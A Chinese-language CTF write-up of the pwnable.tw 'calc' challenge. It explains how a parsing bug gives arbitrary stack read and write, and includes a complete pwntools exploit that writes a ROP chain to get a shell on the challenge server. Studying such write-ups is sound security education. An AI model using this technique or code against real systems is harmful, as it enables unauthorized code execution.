这题实现了一个简单的计算器功能，主要是一个逻辑漏洞

在 get_expr() 中读取

在 parse_expr() 中处理

核心代码

![](https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/pwnablekr-calc-4.png)

运算函数

![](https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/pwnabletw-calc-2.png)

需要注意的是，这里处理的时候是以 num[0] 为基准来判断操作数的位置，而当我们输入的是运算符+操作数

例如 +300 的时候

```
num[0] = 1  num[1] = 300

a2 = "+"
```

此时 num[\*num - 1] += num[\*num]; 即 num[0] = num[0] + num[1] = 301

然后 num[0] -- ，所以最后输出给用户的值实际上是 num[300] ，这就造成了任意读

而如果我们构造 +300-100 就会对栈上的值运算后再输出，这就造成了任意写

通过 ida 可以看到，num 距离当前栈的起始位置为5A0h=1440字节，也就是1440/4=360个栈单元，而众所周知，返回地址是在当前ebp位置的前一个位置入栈，也就是说，返回地址距离 num 的地址为361个栈单元即num[360]

所以我们可以构造 ROP 链来修改栈内容，从而 get shell

![](https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/pwnableke-calc-3.jpg)

其中需要重点关注的是 "/bin/sh" 字符串的地址，我们能获得到当前ebp所指向栈的基址内的值，这个值是main函数的ebp值，也就是main函数的栈基址。

从下图可以看出，main函数的栈空间大小由main函数的基址决定，大小值为：

```
main_stack_size=main_ebp&0xFFFFFF0 - 16
```

![](https://space.0bs3rver.workers.dev/0bs3rver/Picture/master//blogimg/pwnabletw-calc-5.png)

目前可知“/bin/sh”字符串的地址（369）与返回地址（361）之间的距离为8，而main函数栈基址与返回值之间的距离为：

```
d_mainebp_ret=main_stack_size/4 + 1
```

也就推得“/bin/sh”字符串的地址为：

```
addr_binsh=main_ebp+(8-d_mainebp_ret)*4
```

exp

```python
from pwn import *

HOST = 'chall.pwnable.tw'

PORT = 10100

vals=[0x0805c34b,11,0x080701aa,0,0x080701d1,0,1,0x08049a21,0x6e69622f,0x0068732f]

con = remote(HOST,PORT)

print con.recv()

start=361

for i in range(0,6):

	con.send('+'+str(start+i)+'\n')

	val=int(con.recv(1024))

	diff=vals[i]-val

	if diff<0: #正负数注意符号

		con.send('+'+str(start+i)+str(diff)+'\n')

	else:

		con.send('+'+str(start+i)+'+'+str(diff)+'\n')

	resl=int(con.recv(1024))

	print (str(start+i)+': '+'%s'%hex(resl))

#addr of '/bin/sh'

con.send('+360'+'\n')

mebp=int(con.recv(1024))

mstacksize=mebp+0x100000000-((mebp+0x100000000) & 0xFFFFFFF0-16)
#这里+0×100000000是因为recv到的mebp是栈上的地址，被识别为负数，所以加上0x100000000修正，它表示main函数的基地址。

bin_sh_addr=mebp+(8-(mstacksize/4+1))*4

con.send('+367'+'\n')

val_367=int(con.recv(1024))

diff_367=bin_sh_addr-val_367

con.send('+367'+str(diff_367)+'\n')

resl=int(con.recv(1024))+0x100000000

print ('367: '+'%s'%hex(resl))

for i in range(7,10):

	con.send('+'+str(start+i)+'\n')

	val=int(con.recv(1024))

	diff=vals[i]-val

	if diff<0:

		con.send('+'+str(start+i)+str(diff)+'\n')

	else:

		con.send('+'+str(start+i)+'+'+str(diff)+'\n')

	resl=int(con.recv(1024))

	print (str(start+i)+': '+'%s'%hex(resl))

con.interactive("\nshell# ")

con.close()
```

参考：https://www.freebuf.com/articles/others-articles/132283.html
